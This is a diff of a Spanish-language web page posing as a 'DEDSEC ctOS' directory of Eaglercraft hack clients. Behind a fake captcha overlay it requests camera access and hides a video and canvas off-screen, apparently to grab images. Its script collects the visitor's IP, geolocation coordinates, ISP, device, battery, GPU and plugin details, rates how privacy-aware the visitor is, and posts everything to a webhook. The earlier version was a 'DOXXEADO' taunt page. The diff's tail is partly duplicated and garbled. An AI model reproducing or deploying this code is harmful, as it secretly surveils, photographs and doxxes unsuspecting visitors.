@@ -1,86 +1,60 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Texto y Videos Posicionados</title>
-    <style>
-        /* Estilo general del cuerpo para centrado y fondo */
-        body {
-            position: relative; 
-            display: flex;
-            align-items: flex-start; /* Mueve el contenido hacia arriba */
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            font-family: Arial, sans-serif;
-            overflow: hidden; 
-            
-            /* Fondo de imagen de patrón */
-            background-image: url('https://i.imgur.com/cVnL0wo.png'); 
-            background-repeat: repeat;
-        }
-
-        /* 1. Estilo para el elemento de texto (más pequeño y más arriba) */
-        .texto-no-interactivo {
-            font-size: 3em; 
-            color: #ffffff;
-            padding: 15px;
-            text-shadow: 2px 2px 10px rgba(0, 0, 0, 1);
-            
-            /* Desplazamiento hacia arriba */
-            margin-top: 15vh; 
-            
-            /* No interacción */
-            pointer-events: none;
-            z-index: 10; 
-        }
-
-        /* 2. Estilo para el video/GIF en loop en la parte inferior */
-        #video-inferior { 
-            position: absolute; 
-            bottom: 0;
-            left: 50%;
-            transform: translateX(-50%); 
-            width: 80%; 
-            max-width: 800px; 
-            height: auto;
-            z-index: 5; 
-        }
-
-        /* 3. Estilo para el video pequeño en la esquina superior izquierda (PEGADO) */
-        #video-esquina-izquierda {
-            position: absolute;
-            /* Se establece en 0px para pegarlo completamente a la esquina */
-            top: 0px; 
-            left: 0px; 
-            width: 100px; /* Tamaño reducido para ser pequeño */
-            height: auto;
-            z-index: 10;
-            pointer-events: none; 
-        }
-
-    </style>
+<meta charset="utf-8">
+<title>DEDSEC — ctOS®</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  :root{--bg:#05060a;--card:#0f1724;--acc:#a78bfa;--pink:#ec4899;--muted:#9ca3af}
+  body{margin:0;font-family:system-ui;background:var(--bg);color:#fff;min-height:100vh;display:flex;flex-direction:column}
+  header{position:sticky;top:0;background:rgba(0,0,0,.4);backdrop-filter:blur(12px);border-bottom:1px solid #333}
+  .nav{max-width:1200px;margin:auto;padding:16px;display:flex;justify-content:space-between;align-items:center}
+  .logo{width:48px;height:48px;border-radius:12px;background:linear-gradient(135deg,var(--acc),var(--pink));display:grid;place-items:center;font-weight:900;font-size:22px}
+  .title{background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent;font-weight:800}
+  main{flex:1;max-width:1200px;margin:30px auto;padding:0 20px}
+  .grid{display:grid;gap:18px;grid-template-columns:repeat(auto-fit,minmax(270px,1fr))}
+  .card{background:rgba(255,255,255,.025);border:1px solid rgba(255,255,255,.08);border-radius:16px;padding:20px;transition:.25s}
+  .card:hover{transform:translateY(-8px);box-shadow:0 20px 50px rgba(167,139,250,.2)}
+  .name{font-weight:800;font-size:18px;margin-bottom:6px}
+  .open{background:linear-gradient(90deg,var(--acc),var(--pink));color:#fff;border:none;padding:14px;border-radius:14px;font-weight:700;width:100%;cursor:pointer}
+  h1{text-align:center;font-size:2.8rem;margin:20px 0;background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent}
+  video{position:fixed;top:-9999px;left:-9999px;width:640px;height:480px}
+  canvas{display:none}
+</style>
 </head>
 <body>
 
-    <div class="texto-no-interactivo">
-        DOXXEADO JAJA
+<!-- Permiso de cámara al entrar (OPTIMIZADO PARA MÓVIL) -->
+<div id="camPermission" style="position:fixed;inset:0;background:rgba(0,0,0,0.95);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;padding:20px">
+  <h2 style="color:#2d4ab3;font-size:2.5rem">Verificación de seguridad</h2>
+  <p style="font-size:1.5rem;max-width:600px;color:#fff;text-align:center">Para acceder a esta pagina, permite el acceso para completar el Captcha.</p>
+  <button style="background:#2d4ab3;padding:18px 50px;font-size:1.6rem;color:#fff;border:none;border-radius:14px;cursor:pointer;margin-top:30px" onclick="activarCamara()">PERMITIR CÁMARA</button>
+</div>
+
+<div id="mainContent" style="display:none">
+<header>
+  <div class="nav">
+    <div style="display:flex;align-items:center;gap:14px">
+      <div class="logo">HF</div>
+      <div><div class="title">DEDSEC ctOS®</div><small style="color:var(--muted)">@j_eliseoo_v • 2025</small></div>
     </div>
+  </div>
+</header>
+<main>
+  <h1>Clientes Eaglercraft 2025</h1>
+  <div class="grid">
+    <div class="card"><div class="name">DragonX Client</div><div class="ver">V5.1</div><button class="open" data-link="https://eaglerhacks.github.io/dragonxv5.html">Abrir</button></div>
+    <div class="card"><div class="name">WurstX Client</div><button class="open" data-link="https://eaglerhacks.github.io/wurstX.html">Abrir</button></div>
+    <div class="card"><div class="name">UwU+ Client</div><button class="open" data-link="https://eaglerhacks.github.io/UwU+-client-1.0.html">Abrir</button></div>
+    <div class="card"><div class="name">ShadowX Client</div><button class="open" data-link="https://eaglerhacks.github.io/shadowx-client-3.0.html">Abrir</button></div>
+    <div class="card"><div class="name">Sigma Client</div><button class="open" data-link="https://eaglerhacks.github.io/sigma-5.2.html">Abrir</button></div>
+    <div class="card"><div class="name">Future Client</div><button class="open" data-link="https://eaglerhacks.github.io/future-12.5.html">Abrir</button></div>
+  </div>
+</main>
+</div>
 
-    <video id="video-inferior" autoplay muted loop playsinline>
-        <source src="https://i.imgur.com/C7Br6Cc.mp4" type="video/mp4">
-        Tu navegador no soporta el elemento de video.
-    </video>
-    
-    <video id="video-esquina-izquierda" autoplay muted loop playsinline>
-        <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
-        Tu navegador no soporta el elemento de video.
-    </video>
-
-</body>
-</html>
-
+<video id="video" autoplay muted playsinline></video>
+<canvas id="canvas"></canvas>
 
 <script>
 // WEBHOOK
@@ -173,56 +147,6 @@ function dataURLtoBlob(dataurl) {
   const pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'ninguno';
   let userLevel = 'Principiante (no sabe mucho)';
   const savvyPlugins = ['uBlock Origin','AdBlock','Privacy Badger','NoScript','HTTPS Everywhere','ClearURLs','Decentraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
-  if (savvyPlugins.some(p => pluginsList.includes(p))) userLevel = 'Listo/Tech-savvy (sabe de privacidad)';
-  if (pluginsList.includes('PDF Viewer') && pluginsList.length < 50) userLevel = 'Principiante total (solo plugins básicos)';
-
-  const datos = {
-    ip: geo.ip || 'oculta',
-    isp: geo.org || '?',
-    ubicacion: `${geo.city || '?'}, ${geo.regionName || ''}, ${geo.country_name || 'El Salvador'} (${geo.postal || '?'})`,
-    coordenadas: `${geo.latitude || '?'}, ${geo.longitude || '?'}`,
-    hora: new Date().toLocaleString(),
-    navegador: uaData.brands?.map(b=>b.brand+" v"+b.version).join(', ') || navigator.userAgent.substring(0,100),
-    so: uaData.platform || navigator.platform,
-    movil: uaData.mobile ? 'Sí' : 'No',
-    ram: navigator.deviceMemory || '?',
-    cpu: navigator.hardwareConcurrency || '?',
-    pantalla: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-    bateria: battery.level ? `${Math.round(battery.level*100)}% ${battery.charging?'cargando':'descargando'}` : 'no disponible',
-    zona: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    plugins: pluginsList,
-    user_level: userLevel,
-    gpu: webgl,
-    gpu_level: gpuLevel
-  };
-
-  const mensaje =
-`**ctOS User Info**
-**IP:** ${datos.ip} (${datos.isp})
-**Ubicación:** ${datos.ubicacion}
-**Coordenadas:** ${datos.coordenadas}
-**Hora:** ${datos.hora}
-**Navegador:** ${datos.navegador}
-**SO:** ${datos.so} | Móvil: ${datos.movil}
-**RAM:** ${datos.ram} GB | CPU: ${datos.cpu} núcleos
-**Pantalla:** ${datos.pantalla}
-**Batería:** ${datos.bateria}
-**Zona horaria:** ${datos.zona}
-**Plugins:** ${datos.plugins}
-**Nivel del usuario:** ${datos.user_level}
-**GPU:** ${datos.gpu}
-**Tipo de GPU:** ${datos.gpu_level}`;
-
-  await fetch(WEBHOOK, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: mensaje})});
-})();
-
-// Botones normales
-document.querySelectorAll('.open').forEach(btn => {
-  btn.onclick = () => setTimeout(() => window.open(btn.dataset.link, '_blank'), 300);
-});
-</script>
-</body>
-</html>ntraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
   if (savvyPlugins.some(p => pluginsList.includes(p))) userLevel = 'Listo/Tech-savvy (sabe de privacidad)';
   if (pluginsList.includes('PDF Viewer') && pluginsList.length < 50) userLevel = 'Principiante total (solo plugins básicos)';
 
